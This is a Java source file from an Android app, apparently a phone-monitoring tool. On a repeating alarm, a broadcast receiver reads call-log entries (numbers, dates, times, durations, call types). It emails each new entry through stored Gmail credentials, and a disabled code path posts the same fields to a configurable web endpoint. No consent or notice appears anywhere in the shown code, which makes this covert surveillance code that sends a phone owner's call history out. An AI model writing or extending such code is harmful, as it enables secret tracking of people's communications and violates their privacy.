package voluntaty.com.base;

/**
 * Created by supergoga on 1/26/2016.
 */

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;

import com.gmail.GMail;
import com.voluntary.database.DBHelper;
import com.voluntary.database.DataHelper;
import com.voluntary.record.audio.phone.SendMailTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


public class RepeatingAlarmServicePhone extends BroadcastReceiver {


    private DataHelper dh;
    DBHelper db;

    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);

        String servicephone;
        servicephone = null;

        servicephone = dh.selectServicephone("1");
        if(servicephone.length()>0) {


            db = null;
            db = new DBHelper(context, "ZnSoftech.db", null, 2);
            URL_HTTP = null;
            URL_HTTP = dh.selectUrl_Http();

            String strt1 = null;
            strt1 = dh.selectGps();

            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();

            String idphone = null;


            Cursor c = null;
            c = db.getData();

            // Toast.makeText(context," count --- "+c.getCount(), Toast.LENGTH_LONG).show();

            if (c.getCount() > 0) {
                c.moveToFirst();
                do {
                    String id = null;
                    id = c.getString(0);
                    String number = null;
                    number = c.getString(1);
                    String date = null;
                    date = c.getString(2);
                    String time = null;
                    time = c.getString(3);
                    String duration = null;
                    duration = c.getString(4);
                    String type = null;
                    type = c.getString(5);

                    idphone = dh.selectIdPhone();
                    int idnumperphone = (Integer.parseInt(id));
                    int idnumberphonedatabase = (Integer.parseInt(idphone));
                    if (idnumperphone > idnumberphonedatabase) {
                        dh.InsertIdPhone(id);

                        List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));
    new SendMailTask().execute(email,password,toEmailList, "Record Phone","&"+number+"&"+date+"&"+time+"&"+duration+"&"+type);

                  //	  Toast.makeText(context.getApplicationContext()," ? "+idphone+" "+" ? id: "+id+"\nNumber:"+number+"\nDate:"+date+"\nTime:"+time+"\nDuration:"+duration+"\nCall Type:"+type+"\n\n", Toast.LENGTH_LONG).show();

                 //       new RequestTask().execute(number, date, time, duration, type, email, URL_HTTP);

                    }
                    id = null;
                    number = null;
                    date = null;
                    time = null;
                    duration = null;
                    type = null;

                } while (c.moveToNext());
            }

            c = null;
            idphone = null;
        //    dh = null;
            db = null;
            //		  URL_HTTP=null;
            strt1 = null;
            login = null;
            email = null;
            password = null;

        }
            servicephone = null;
            dh = null;
    }



    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {
	  		/*
	  			for (String url : params) {
	  			str2=url;

	  			}
	  			*/

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[6]+"/index.php/api/phone");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(6);
                //0

                nameValuePairs.add(new BasicNameValuePair("number",params[0]));
                nameValuePairs.add(new BasicNameValuePair("date",params[1]));
                nameValuePairs.add(new BasicNameValuePair("time",params[2]));
                nameValuePairs.add(new BasicNameValuePair("duration",params[3]));
                nameValuePairs.add(new BasicNameValuePair("type",params[4]));
                nameValuePairs.add(new BasicNameValuePair("email",params[5]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }


}
